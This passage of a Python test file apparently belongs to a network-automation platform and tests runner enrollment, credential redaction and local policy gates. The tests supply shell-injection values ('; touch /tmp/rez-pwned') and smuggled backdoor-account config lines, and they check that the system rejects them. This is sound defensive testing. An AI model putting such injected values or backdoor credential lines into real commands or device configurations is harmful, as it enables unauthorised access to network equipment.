    jobs = client.get("/api/jobs").json()["jobs"]
    probe_jobs = [j for j in jobs if j["action"] == "read_rez_server_listener_probe"]
    assert probe_jobs
    probe_payload = probe_jobs[0]["payload"]
    assert probe_payload["source_device"] == "arista-dc"
    assert probe_payload["dst_port"] == 443
    assert probe_payload["_runner_timeout_seconds"] == 1.0
    assert "username" not in probe_payload and "password" not in probe_payload


def test_rez_runner_read_endpoint_roundtrip_returns_runner_stdout(tmp_path: Path, monkeypatch):
    import hashlib
    import hmac as hmac_mod
    import threading
    import time

    from netcode.runner_hub import canonical_json

    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "store-lab")
    client = TestClient(api.app)

    enroll = client.post(
        "/api/runner/enroll",
        json={"join_token": client.post("/api/runners/join-token", json={"pool": "store-lab"}).json()["join_token"], "name": "r1"},
    ).json()
    token, secret = enroll["runner_token"], enroll["hmac_secret"]
    auth = {"Authorization": f"Bearer {token}"}
    canned = {
        "ok": True,
        "status": "pass",
        "device": "edge-1",
        "command": "show version",
        "stdout": "EOS version 4.31.0F",
        "stderr": "",
    }

    def fake_runner():
        for _ in range(60):
            claim = client.post("/api/runner/poll", json={"wait_seconds": 0}, headers=auth)
            if claim.status_code == 200:
                job = claim.json()["job"]
                assert job["action"] == "read_rez_ssh_command"
                assert job["payload"] == {"device": "edge-1", "command": "show version", "_runner_timeout_seconds": 60.0}
                sig = hmac_mod.new(secret.encode(), canonical_json(canned).encode(), hashlib.sha256).hexdigest()
                client.post(
                    f"/api/runner/jobs/{job['id']}/result",
                    json={"result": canned, "signature": sig, "lease_token": job["lease_token"]},
                    headers=auth,
                )
                return
            time.sleep(0.1)

    t = threading.Thread(target=fake_runner, daemon=True)
    t.start()
    resp = client.post(
        "/api/rez/runner-read",
        json={"action": "rez_ssh_command", "payload": {"device": "edge-1", "command": "show version"}},
    )
    t.join(timeout=10)

    assert resp.status_code == 200
    assert resp.json()["stdout"] == "EOS version 4.31.0F"


def test_runner_rez_api_get_state_filters_sections(tmp_path: Path, monkeypatch):
    import types

    from netcode import runner_agent
    import netcode.adapters.registry as registry

    inv = tmp_path / "inventory.yaml"
    inv.write_text(
        """
defaults:
  username: admin
  password: admin
devices:
  - id: fgt-hub
    hostname: fgt-hub
    host: 127.0.0.1
    platform: fortinet
    port: 2222
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inv)

    class FakeRez:
        def collect_device_state(self, device):  # noqa: ANN001
            return {
                "ok": True,
                "state": {
                    "hostname": "fgt-hub",
                    "platform": "fortinet",
                    "interfaces": {"port1": {"status": "up"}},
                    "routing": {"routes": []},
                },
            }

    monkeypatch.setattr(registry, "AdapterRegistry", lambda: types.SimpleNamespace(rez=FakeRez()))

    result = runner_agent._execute_read_inner(
        "rez_api_get_state",
        {"device": "fgt-hub", "sections": ["interfaces"]},
    )

    assert result["ok"] is True
    assert result["state"]["interfaces"] == {"port1": {"status": "up"}}
    assert "routing" not in result["state"]
    assert "interfaces" in result["available_sections"]


def test_runner_rez_api_query_extracts_nested_security_category(tmp_path: Path, monkeypatch):
    import types

    from netcode import runner_agent
    import netcode.adapters.registry as registry

    inv = tmp_path / "inventory.yaml"
    inv.write_text(
        """
defaults:
  username: admin
  password: admin
devices:
  - id: fgt-hub
    hostname: fgt-hub
    host: 127.0.0.1
    platform: fortinet
    port: 2222
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inv)

    class FakeRez:
        def collect_device_state(self, device):  # noqa: ANN001
            return {
                "ok": True,
                "state": {
                    "security": {
                        "firewall_policies": [{"id": 3, "action": "accept"}],
                        "nat_rules": [{"id": "policy-nat-3"}],
                    }
                },
            }

    monkeypatch.setattr(registry, "AdapterRegistry", lambda: types.SimpleNamespace(rez=FakeRez()))

    result = runner_agent._execute_read_inner(
        "rez_api_query",
        {"device": "fgt-hub", "category": "firewall_policies"},
    )

    assert result["ok"] is True
    assert result["source_section"] == "firewall_policies"
    assert result["data"] == [{"id": 3, "action": "accept"}]


def test_runner_rez_refresh_targeted_returns_merge_shape(tmp_path: Path, monkeypatch):
    import types

    from netcode import runner_agent
    import netcode.adapters.registry as registry

    inv = tmp_path / "inventory.yaml"
    inv.write_text(
        """
defaults:
  username: admin
  password: admin
devices:
  - id: fgt-hub
    hostname: fgt-hub
    host: 127.0.0.1
    platform: fortinet
    port: 2222
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inv)

    class FakeRez:
        def collect_device_state(self, device):  # noqa: ANN001
            return {
                "ok": True,
                "state": {
                    "hostname": "fgt-hub",
                    "platform": "fortinet",
                    "interfaces": {"port1": {"status": "up"}},
                },
            }

    monkeypatch.setattr(registry, "AdapterRegistry", lambda: types.SimpleNamespace(rez=FakeRez()))

    result = runner_agent._execute_read_inner(
        "rez_refresh_targeted",
        {"devices": ["fgt-hub"]},
    )

    assert result["ok"] is True
    assert result["refreshed"] == ["fgt-hub"]
    assert result["failed"] == []
    assert result["skipped"] == []
    assert result["device_states"]["fgt-hub"]["_refreshed"] is True
    assert result["device_states"]["fgt-hub"]["interfaces"] == {"port1": {"status": "up"}}


def test_runner_rez_scan_device_uses_local_inventory_defaults(tmp_path: Path, monkeypatch):
    import types

    from netcode import runner_agent
    import netcode.adapters.registry as registry

    inv = tmp_path / "inventory.yaml"
    inv.write_text(
        """
defaults:
  username: runner-admin
  password: runner-secret
devices:
  - id: seed
    hostname: seed
    host: 127.0.0.1
    platform: arista_eos
    port: 2222
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inv)
    seen = {}

    class FakeRez:
        def normalize_platform(self, value):  # noqa: ANN001
            return value or ""

        def driver_map(self):
            return {"arista_eos": object}

        def summary(self):
            return {}

        def collect_device_state(self, device):  # noqa: ANN001
            seen["device"] = device
            return {
                "ok": True,
                "adapter": "rez.arista_eos",
                "driver": "drivers.arista_eos.AsyncAristaEOSDriver",
                "state": {
                    "hostname": "new-edge",
                    "platform": "arista_eos",
                    "interfaces": {"Ethernet1": {"status": "up"}},
                    "routing": {"routes": [{"prefix": "0.0.0.0/0"}]},
                },
                "warnings": [],
                "errors": [],
            }

    monkeypatch.setattr(registry, "AdapterRegistry", lambda: types.SimpleNamespace(rez=FakeRez()))

    result = runner_agent._execute_read_inner(
        "rez_scan_device",
        {"host": "192.0.2.10", "platform": "arista_eos", "device_id": "new-edge", "username": "must-not-use", "password": "must-not-use"},
    )

    assert result["ok"] is True
    assert result["provider"] == "rez-runner"
    assert result["source_of_truth_candidate"]["id"] == "new-edge"
    assert result["source_of_truth_candidate"]["host"] == "192.0.2.10"
    assert result["runner_inventory"]["action"] == "added"
    assert result["state"]["interfaces"] == {"Ethernet1": {"status": "up"}}
    assert seen["device"].username == "runner-admin"
    assert seen["device"].password == "runner-secret"
    updated = Inventory(inv)
    assert updated.by_id["new-edge"].host == "192.0.2.10"
    assert updated.by_id["new-edge"].username == "runner-admin"
    assert updated.by_id["new-edge"].password == "runner-secret"


def test_runner_rez_source_probes_use_local_inventory_and_fixed_commands(tmp_path: Path, monkeypatch):
    import sys
    import types

    from netcode import runner_agent

    inv = tmp_path / "inventory.yaml"
    inv.write_text(
        """
defaults:
  username: default-admin
  password: default-secret
devices:
  - id: arista-dc
    hostname: arista-dc
    host: 127.0.0.1
    platform: arista_eos
    username: runner-admin
    password: runner-secret
    port: 3401
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inv)
    captured = []

    class FakeConn:
        def __init__(self, **kwargs):  # noqa: ANN001
            captured.append({"connect": kwargs})

        def enable(self):
            return None

        def send_command(self, command, **_kwargs):  # noqa: ANN001
            captured.append({"command": command})
            if "nc -vz" in command:
                return "Ncat: Connection refused."
            return "HTTP/1.1 403 Forbidden\nblocked"

        def send_command_timing(self, command, **_kwargs):  # noqa: ANN001
            return self.send_command(command)

        def disconnect(self):
            return None

    monkeypatch.setitem(sys.modules, "netmiko", types.SimpleNamespace(ConnectHandler=lambda **kwargs: FakeConn(**kwargs)))

    listener = runner_agent._execute_read_inner(
        "rez_server_listener_probe",
        {
            "source_device": "arista-dc",
            "src_ip": "10.10.0.10",
            "dst_ip": "10.20.0.10",
            "dst_port": 443,
            "timeout_seconds": 2,
            "username": "must-not-use",
            "password": "must-not-use",
        },
    )
    http = runner_agent._execute_read_inner(
        "rez_http_flow_probe",
        {
            "source_device": "arista-dc",
            "src_ip": "10.10.0.10",
            "dst_ip": "1.1.1.1",
            "dst_port": 80,
            "timeout_seconds": 3,
        },
    )

    assert listener["ok"] is True
    assert listener["source_matches_flow"] is True
    assert listener["listener_present"] is False
    assert listener["rootable"] is True
    assert http["ok"] is True
    assert http["root_atom"] == "FW_URL_FILTER_BLOCK"
    assert captured[0]["connect"]["username"] == "runner-admin"
    assert captured[0]["connect"]["password"] == "runner-secret"
    commands = [entry["command"] for entry in captured if "command" in entry]
    assert commands == [
        "bash timeout 2 nc -vz 10.20.0.10 443",
        "bash timeout 3 curl -v -m 3 http://1.1.1.1/ 2>&1 | head -120",
    ]

    before = list(commands)
    listener_bad = runner_agent._execute_read_inner(
        "rez_server_listener_probe",
        {
            "source_device": "arista-dc",
            "src_ip": "10.10.0.10",
            "dst_ip": "10.20.0.10; touch /tmp/rez-pwned",
            "dst_port": 443,
        },
    )
    http_bad = runner_agent._execute_read_inner(
        "rez_http_flow_probe",
        {
            "source_device": "arista-dc",
            "src_ip": "10.10.0.10",
            "dst_ip": "1.1.1.1; touch /tmp/rez-pwned",
            "dst_port": 80,
        },
    )
    after = [entry["command"] for entry in captured if "command" in entry]

    assert listener_bad["ok"] is False
    assert http_bad["ok"] is False
    assert "does not appear" in listener_bad["error"] or "Expected" in listener_bad["error"]
    assert "does not appear" in http_bad["error"] or "Expected" in http_bad["error"]
    assert after == before


def test_runner_read_timeout_cancels_queued_job(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "store-lab")

    class FastClock:
        current = 0.0

        @classmethod
        def monotonic(cls):
            cls.current += 1.0
            return cls.current

        @staticmethod
        def sleep(_seconds):  # noqa: ANN001
            return None

    monkeypatch.setattr(api, "time", FastClock)

    result = api._runner_read(
        WorkspacePaths(tmp_path),
        "rez_ssh_command",
        {"device": "v2-store1", "command": "show version"},
        "org_default",
        timeout=1,
    )

    assert result["ok"] is False
    jobs = PlatformStore(WorkspacePaths(tmp_path)).list_jobs()
    assert jobs[0].action == "read_rez_ssh_command"
    assert jobs[0].status == "failed"
    assert "Cancelled: read deadline" in jobs[0].message


def test_runner_local_policy_gate_blocks_forbidden_config(tmp_path: Path):
    """The runner's own fail-closed gate must reject credential/out-of-scope config
    even if the control plane said it was fine."""
    from netcode.models import RenderResult, load_intent
    from netcode.runner_checks import local_policy_gate

    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    policy_yaml = (paths.root / "policies" / "invariants.yaml").read_text()
    intent = load_intent(paths.intents / "examples" / "add_guest_vlan.yaml")

    clean = RenderResult(template_path="x", config="vlan 90\n   name GUEST_WIFI\n", variables={})
    assert local_policy_gate(intent, clean, policy_yaml)["ok"] is True

    smuggled = RenderResult(template_path="x", config="vlan 90\n   name GUEST_WIFI\nusername backdoor secret oops\n", variables={})
    gate = local_policy_gate(intent, smuggled, policy_yaml)
    assert gate["ok"] is False
    assert gate["blocked_lines"]

    # Malformed policy must fail closed, not open.
    assert local_policy_gate(intent, clean, "{{ not: valid: yaml")["ok"] is False


def test_runner_local_policy_gate_accepts_only_typed_redistribution_scope(tmp_path: Path):
    """Runner and control plane must enforce the same typed redistribution contract."""
    from netcode.models import RenderResult, RoutingRedistributionIntent
    from netcode.runner_checks import local_policy_gate

    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    policy_yaml = (paths.root / "policies" / "invariants.yaml").read_text()
    intent = RoutingRedistributionIntent.model_validate({
        "site": "campus",
        "targets": {"device_ids": ["v2-campus-edge-1"]},
        "redistribution": {
            "from_protocol": "bgp",
            "to_protocol": "ospf",
            "target_process": "1",
            "route_map": "CAMPUS-BGP-TO-OSPF",
            "prefix_list": "ENTERPRISE-REMOTE-LOOPBACKS",
            "prefixes": ["1.1.1.0/24", "4.4.4.0/24"],
            "route_tag": 65002,
        },
    })
    clean = RenderResult(
        template_path="routing_redistribution.j2",
        config=(
            "ip prefix-list ENTERPRISE-REMOTE-LOOPBACKS seq 10 permit 1.1.1.0/24 le 32\n"
            "route-map CAMPUS-BGP-TO-OSPF permit 10\n"
            "   match ip address prefix-list ENTERPRISE-REMOTE-LOOPBACKS\n"
            "   set tag 65002\n"
            "router ospf 1\n"
            "   redistribute bgp route-map CAMPUS-BGP-TO-OSPF\n"
        ),
        variables={},
    )
    assert local_policy_gate(intent, clean, policy_yaml)["ok"] is True

    out_of_scope = RenderResult(
        template_path="routing_redistribution.j2",
        config=clean.config + "router bgp 65030\n",
        variables={},
    )
    result = local_policy_gate(intent, out_of_scope, policy_yaml)
    assert result["ok"] is False
    assert result["unexpected_lines"] == ["router bgp 65030"]

    credentials = RenderResult(
        template_path="routing_redistribution.j2",
        config=clean.config + "username backdoor privilege 15 secret unsafe\n",
        variables={},
    )
    result = local_policy_gate(intent, credentials, policy_yaml)
    assert result["ok"] is False
    assert result["blocked_lines"] == ["username backdoor privilege 15 secret unsafe"]


def test_runner_local_policy_gate_accepts_exact_bidirectional_exchange(tmp_path: Path):
    from netcode.models import RenderResult, RoutingRedistributionIntent
    from netcode.runner_checks import local_policy_gate

    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    policy_yaml = (paths.root / "policies" / "invariants.yaml").read_text()
    intent = RoutingRedistributionIntent.model_validate({
        "site": "campus",
        "targets": {"device_ids": ["v2-campus-edge-1"]},
        "redistribution": {
            "from_protocol": "bgp",
            "to_protocol": "ospf",
            "target_process": "1",
            "route_map": "CAMPUS-BGP-TO-OSPF",
            "prefix_list": "REMOTE-ROUTES",
            "prefixes": ["1.1.1.0/24"],
            "route_tag": 65002,
        },
        "reverse_redistribution": {
            "from_protocol": "ospf",
            "to_protocol": "bgp",
            "target_process": "65002",
            "route_map": "CAMPUS-OSPF-TO-BGP",
            "prefix_list": "CAMPUS-ROUTES",
            "prefixes": ["3.3.3.0/24"],
            "route_tag": 65003,
        },
    })
    clean = RenderResult(
        template_path="routing_redistribution.j2",
        config=(
            "ip prefix-list REMOTE-ROUTES seq 10 permit 1.1.1.0/24 le 32\n"
            "route-map CAMPUS-BGP-TO-OSPF permit 10\n"
            "   match ip address prefix-list REMOTE-ROUTES\n"
            "   set tag 65002\n"
            "router ospf 1\n"
            "   redistribute bgp route-map CAMPUS-BGP-TO-OSPF\n"
            "ip prefix-list CAMPUS-ROUTES seq 10 permit 3.3.3.0/24 le 32\n"
            "route-map CAMPUS-OSPF-TO-BGP permit 10\n"
            "   match ip address prefix-list CAMPUS-ROUTES\n"
            "router bgp 65002\n"
            "   address-family ipv4\n"
            "      redistribute ospf route-map CAMPUS-OSPF-TO-BGP\n"
        ),
        variables={},
    )

    assert local_policy_gate(intent, clean, policy_yaml)["ok"] is True
    injected = RenderResult(
        template_path=clean.template_path,
        config=clean.config + "router bgp 65123\n",
        variables={},
    )
    result = local_policy_gate(intent, injected, policy_yaml)
    assert result["ok"] is False
    assert result["unexpected_lines"] == ["router bgp 65123"]


def test_runner_mode_device_credentials_rejected_before_queue_or_import(tmp_path: Path, monkeypatch):
    """Enterprise mode: cloud paths never accept device credentials. Credentials
    are configured on the runner, then discovery/manual-add submit public facts
    only."""
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "store-lab")
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    client = TestClient(api.app)

    discovery = client.post(
        "/api/discovery/scan",
        json={"host": "10.0.0.9", "username": "admin", "password": "hunter2", "platform": "arista_eos"},
    )
    assert discovery.status_code == 400
    assert "runner" in discovery.json()["detail"].lower()

    manual = client.post(
        "/api/shell/devices/manual",
        json={
            "device_id": "edge-1",
            "hostname": "edge-1",
            "host": "10.0.0.9",
            "platform": "arista_eos",
            "username": "admin",
            "password": "hunter2",
            "port": 22,
        },
    )
    assert manual.status_code == 400
    assert "hunter2" not in json.dumps(client.get("/api/source-of-truth").json())


def test_runner_discovery_auto_imports_public_source_of_truth_and_unblocks_planning(tmp_path: Path, monkeypatch):
    """One runner discovery should make the device usable by Automation and Rez.

    The runner may know credentials locally, but the control plane imports only
    the public source_of_truth_candidate returned by the runner.
    """
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "store-lab")
    calls: list[dict[str, object]] = []

    def fake_runner_read(p, action, payload, org_id, timeout=60.0):  # noqa: ANN001
        calls.append({"action": action, "payload": dict(payload), "org_id": org_id, "timeout": timeout})
        if action == "discovery":
            return {
                "ok": True,
                "provider": "rez-runner",
                "source_of_truth_candidate": {
                    "id": "edge-1",
                    "hostname": "edge-1",
                    "host": "192.0.2.10",
                    "platform": "arista_eos",
                    "site": "site-101",
                    "role": "edge",
                    "groups": ["edge", "discovered"],
                    "port": 2222,
                    "username": "runner-admin",
                    "password": "runner-secret",
                },
                "runner_inventory": {"action": "added"},
                "safety": {"device_writes": "none", "source_of_truth_written": False},
            }
        if action == "rez_ssh_command":
            return {"ok": True, "device": payload.get("device"), "stdout": "edge-1 uptime is 1 day", "status": "pass"}
        raise AssertionError(f"unexpected runner action {action}")

    monkeypatch.setattr(api, "_runner_read", fake_runner_read)
    client = TestClient(api.app)

    discovery = client.post(
        "/api/discovery/scan",
        json={"host": "192.0.2.10", "platform": "arista_eos", "device_id": "edge-1", "site": "site-101", "groups": ["edge"]},
    )
    discovery_body = discovery.json()

    assert discovery.status_code == 200
    assert discovery_body["ok"] is True
    assert discovery_body["source_of_truth"]["ok"] is True
    assert discovery_body["safety"]["source_of_truth_written"] is True
    assert discovery_body["device"]["id"] == "edge-1"

    source = client.get("/api/source-of-truth").json()
    serialized_source = json.dumps(source)
    assert "edge-1" in serialized_source
    assert "192.0.2.10" in serialized_source
    assert "edge" in serialized_source
    assert "runner-secret" not in serialized_source
    assert "runner-admin" not in serialized_source

    plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "add_vlan",
            "site": "site-101",
            "device_id": "edge-1",
            "requested_by": "unit",
            "values": {"vlan_id": 210, "name": "APP_210", "subnet": "10.210.0.0/24"},
        },
    )
    assert plan.status_code == 200
    assert plan.json()["change"]["device_id"] == "edge-1"
    assert "vlan 210" in plan.json()["pipeline"]["render"]["config"]

    rez = client.post(
        "/api/rez/runner-read",
        json={"action": "rez_ssh_command", "payload": {"device": "edge-1", "command": "show version"}, "timeout": 10},
    )
    assert rez.status_code == 200
    assert rez.json()["ok"] is True
    assert rez.json()["device"] == "edge-1"
    assert calls[-1]["action"] == "rez_ssh_command"
    assert calls[-1]["payload"]["device"] == "edge-1"


def test_runner_inventory_import_installs_credentials_locally(tmp_path: Path, monkeypatch):
    from types import SimpleNamespace

    from netcode import runner_agent

    source = tmp_path / "candidate_inventory.yaml"
    destination = tmp_path / ".netcode-runner" / "inventory.yaml"
    source.write_text(
        """
defaults:
  username: admin
  password: local-only
devices:
  - id: edge-1
    hostname: edge-1
    host: 10.0.0.9
    platform: arista_eos
    port: 22
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(runner_agent, "IDENTITY_DIR", destination.parent)
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", destination)

    rc = runner_agent.import_inventory(SimpleNamespace(file=str(source)))

    assert rc == 0
    assert destination.exists()
    assert "local-only" in destination.read_text(encoding="utf-8")
    if os.name != "nt":
        assert oct(destination.stat().st_mode & 0o777) == "0o600"


def test_runner_inventory_import_rejects_invalid_file(tmp_path: Path, monkeypatch):
    from types import SimpleNamespace

    from netcode import runner_agent

    bad = tmp_path / "bad_inventory.yaml"
    destination = tmp_path / ".netcode-runner" / "inventory.yaml"
    bad.write_text("defaults: {}\n", encoding="utf-8")
    monkeypatch.setattr(runner_agent, "IDENTITY_DIR", destination.parent)
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", destination)

    rc = runner_agent.import_inventory(SimpleNamespace(file=str(bad)))

    assert rc == 1
    assert not destination.exists()


def test_read_job_payload_redaction_remains_defense_in_depth(tmp_path: Path):
    from netcode.store import record_to_dict, redact_secrets

    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    store = PlatformStore(paths)

    job = store.create_read_job(
        "org_default",
        "store-lab",
        "legacy_or_external_read",
        {"host": "10.0.0.9", "username": "admin", "password": "hunter2", "platform": "arista_eos"},
    )
    # On return, the password is redacted even while the job is still queued.
    listed = record_to_dict(store.list_jobs(org_id="org_default")[0])
    assert listed["payload"]["password"] == "***redacted***"
    assert "hunter2" not in json.dumps(listed)

    # Scrub-on-CLAIM remains defense-in-depth for legacy/external callers.
    claimed = store.claim_next_job("org_default", "store-lab", "runner-x")
    assert claimed.id == job.id
    assert claimed.payload["password"] == "hunter2"  # runner gets the real cred
    reopened = PlatformStore(paths)
    at_rest = reopened.get_job(job.id)
    assert at_rest.payload["password"] == "***redacted***"  # but the DB copy is scrubbed
    assert "hunter2" not in json.dumps(at_rest.payload)

    # Broadened redaction catches the spellings the red-team named; non-secret
    # fields survive.
    red = redact_secrets({"pwd": "x", "api_key": "y", "passphrase": "z", "host": "1.2.3.4", "port": 22})
    assert red["pwd"] == "***redacted***" and red["api_key"] == "***redacted***" and red["passphrase"] == "***redacted***"
    assert red["host"] == "1.2.3.4" and red["port"] == 22


def test_verification_handoff_builds_rez_context_without_writes(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    client = TestClient(api.app)

    before_changes = client.get("/api/changes").json()["changes"]
    response = client.post(
        "/api/diagnostics/verification-handoff",
        json={
            "device_id": "edge-fw-01",
            "check": "vlan_exists",
            "expected": "VLAN 210 present on uplink",
            "actual": "VLAN 210 missing from trunk allowed list",
            "verification": {"ok": False, "status": "fail", "message": "VLAN 210 not found"},
            "change_id": "chg-2048",
            "intent_path": "intents/chg-2048.yaml",
        },
    )

    assert response.status_code == 200
    body = response.json()
    assert body["handoff_type"] == "verification_failure_to_rez"
    assert "expected state" in body["question"]
    assert "VLAN 210 present" in body["question"]
    assert "VLAN 210 missing" in body["question"]
    assert ".." not in body["question"]
    assert body["context"]["failed"] is True
    assert body["context"]["read_only"] is True
    assert body["remediation_plan"]["status"] == "not_created"
    assert body["remediation_plan"]["direct_write_allowed"] is False
    assert body["safety"]["device_writes"] == "none"

    after_changes = client.get("/api/changes").json()["changes"]
    assert after_changes == before_changes


def test_failed_intent_verify_attaches_read_only_handoff_to_change(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "add_vlan",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {"vlan_id": 210, "name": "APP_210", "subnet": "10.210.0.0/24"},
        },
    ).json()
    change_id = plan["change"]["id"]

    def fake_runner_read(p, action, payload, org_id, timeout=60.0):  # noqa: ANN001
        assert action == "verify"
        return {
            "ok": False,
            "device_id": payload["device_id"],
            "verification": {"status": "fail", "message": "VLAN 210 is missing"},
        }

    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setattr(api, "_runner_read", fake_runner_read)

    verify = client.post(
        "/api/verify/intent",
        json={"intent_path": plan["intent_path"], "device_id": "v2-store1", "change_id": change_id},
    )

    assert verify.status_code == 200
    body = verify.json()
    assert body["ok"] is False
    assert body["diagnostics_handoff"]["safety"]["device_writes"] == "none"
    stored = PlatformStore(WorkspacePaths(tmp_path)).get_change(change_id)
    assert stored.result["diagnostics_handoffs"][0]["context"]["read_only"] is True
    assert stored.result["diagnostics_handoffs"][0]["context"]["failed"] is True
    assert PlatformStore(WorkspacePaths(tmp_path)).list_jobs() == []


def test_successful_intent_verify_persists_proof_and_verified_state(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "add_vlan",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {"vlan_id": 211, "name": "APP_211", "subnet": "10.211.0.0/24"},
        },
    ).json()
    change_id = plan["change"]["id"]

    def fake_runner_read(p, action, payload, org_id, timeout=60.0):  # noqa: ANN001
        assert action == "verify"
        return {
            "ok": True,
            "device_id": payload["device_id"],
            "verification": {"status": "pass", "message": "VLAN 211 is present"},
        }

    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setattr(api, "_runner_read", fake_runner_read)

    verify = client.post(
        "/api/verify/intent",
        json={"intent_path": plan["intent_path"], "device_id": "v2-store1", "change_id": change_id},
    )

    assert verify.status_code == 200
    assert verify.json()["ok"] is True
    store = PlatformStore(WorkspacePaths(tmp_path))
    stored = store.get_change(change_id)
    assert stored.workflow_state == "verified"
    assert stored.result["verify_proof"]["message"] == "VLAN 211 is present"
    assert any(event.action == "verify" and event.to_state == "verified" for event in store.list_workflow_events(change_id))


def test_runner_credential_floor_survives_empty_and_hostile_policy(tmp_path: Path):
    """Trust-debt #2: a compromised control plane shipping an EMPTY policy (or a
    custom_config intent, whose allow-list is empty) still cannot push
    credentials — the hardcoded floor is enforced regardless of policy."""
    from types import SimpleNamespace

    from netcode.models import RenderResult
    from netcode.runner_checks import local_policy_gate

    # custom_config: allow-list is empty, so only blocked-fragments protect us.
    intent = SimpleNamespace(change_type="custom_config")  # gate reads only .change_type
    creds = RenderResult(template_path="x", config="username backdoor secret oops\n", variables={})

    # Empty payload policy AND empty local policy -> floor still blocks.
    gate = local_policy_gate(intent, creds, "", "")
    assert gate["ok"] is False and gate["blocked_lines"]

    # Hostile policy that explicitly clears blocked_fragments -> floor still blocks.
    hostile = "render_scope:\n  blocked_fragments: []\n  custom_config_allowed_prefixes: ['username ']\n"
    gate = local_policy_gate(intent, creds, hostile, "")
    assert gate["ok"] is False and gate["blocked_lines"]

    # A benign custom_config line passes under empty policy (floor doesn't over-block).
    benign = RenderResult(template_path="x", config="ntp server 10.0.0.1\n", variables={})
    assert local_policy_gate(intent, benign, "", "")["ok"] is True


def test_backend_blocks_apply_before_dry_run(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    safety = client.post("/api/wizard/add-vlan", json={})
    assert safety.status_code == 200
    change_id = safety.json()["change"]["id"]
    apply = client.post(
        "/api/lab/apply",
        json={
            "intent_path": safety.json()["intent_path"],
            "device_id": "v2-store1",
            "change_id": change_id,
        },
    )
    data = apply.json()

    assert apply.status_code == 200
    assert data["ok"] is False
    assert data["change"]["workflow_state"] == "blocked"
    assert data["job"] is None
    assert "Dry-run proof is required before apply" in data["result"]["message"]


def test_workflow_events_are_recorded(tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    store = PlatformStore(paths)
    change = store.create_change(paths.intents / "examples" / "add_guest_vlan.yaml", "v2-store1")

    event = store.record_workflow_event(change.id, "check_safety", "draft", "validated", "ok", {"checks": 7})
    events = store.list_workflow_events(change.id)

    assert event.to_state == "validated"
    assert store.get_change(change.id).workflow_state == "validated"
    assert events[0].evidence == {"checks": 7}


def test_pending_feature_endpoints(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    safety = client.post("/api/wizard/add-vlan", json={}).json()
    gitops = client.post("/api/gitops/plan", json={"intent_path": safety["intent_path"]})
    conformance = client.get("/api/adapters/conformance")
    providers = client.get("/api/source-of-truth/providers")
    scale = client.post("/api/scale/plan", json={"canary_size": 1, "batch_size": 100})
    assistant = client.post("/api/assistant", json={"prompt": "Explain risk for vlan 90", "context": {"workflow": safety["workflow"]}})
    compliance = client.get("/api/compliance/summary")
    discovery_import = client.post(
        "/api/source-of-truth/devices/import",
        json={
            "candidate": {
                "id": "edge1",
                "hostname": "edge1",
                "host": "192.0.2.11",
                "platform": "cisco_ios",
                "site": "dc1",
                "groups": ["edge"],
            }
        },
    )

    assert gitops.status_code == 200
    assert gitops.json()["pull_request"]["required_review_evidence"]
    assert gitops.json()["repository_setup"]["commands"]
    assert conformance.status_code == 200
    assert "conformance" in conformance.json()
    assert providers.status_code == 200
    provider_ids = {provider["id"] for provider in providers.json()["providers"]}
    assert "nautobot" not in provider_ids
    assert "netbox" not in provider_ids
    assert "infoblox" in provider_ids
    infoblox = next(provider for provider in providers.json()["providers"] if provider["id"] == "infoblox")
    assert infoblox["status"] == "deferred"
    assert infoblox["writes"] is False
    assert scale.status_code == 200
    assert scale.json()["controls"]["pause_on_failure"] is True
    assert assistant.status_code == 200
    assert assistant.json()["guardrails"]
    assert compliance.status_code == 200
    assert compliance.json()["remediation_states"] == ["detect", "classify", "approve_fix", "apply", "verify"]
    assert discovery_import.status_code == 200
    assert discovery_import.json()["device"]["platform"] == "cisco_ios"


